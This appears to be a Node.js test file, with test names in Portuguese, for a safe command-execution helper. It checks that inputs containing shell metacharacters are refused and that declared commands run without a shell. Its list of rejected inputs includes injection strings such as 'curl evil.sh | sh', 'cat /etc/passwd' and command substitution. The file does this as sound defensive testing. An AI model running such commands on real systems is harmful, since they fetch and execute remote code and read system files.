import test from "node:test";
import assert from "node:assert";
import { toArgv, isSafe, runDeclared } from "../lib/exec.js";

test("recusa sintaxe de shell vinda de arquivo de dado", () => {
  for (const evil of [
    "id > /tmp/pwned; echo PWNED",
    "echo ok && curl evil.sh | sh",
    "echo $(whoami)",
    "cat /etc/passwd | head -1",
    "echo `id`",
  ])
    assert.equal(isSafe(evil), false, evil);
});

test("comando declarado sem metacaractere passa", () => {
  assert.equal(isSafe("git rev-parse HEAD"), true);
  assert.deepEqual(toArgv('grep -c "foo bar" file.txt'), ["grep", "-c", "foo bar", "file.txt"]);
});

test("payload do pentest nao executa", () => {
  const r = runDeclared("id > /tmp/bilro_test_pwned; echo PWNED");
  assert.equal(r.refused, true);
  assert.equal(r.ok, false);
});

test("execucao real acontece sem shell", () => {
  const r = runDeclared("echo hello");
  assert.equal(r.ok, true);
  assert.match(r.output, /hello/);
});
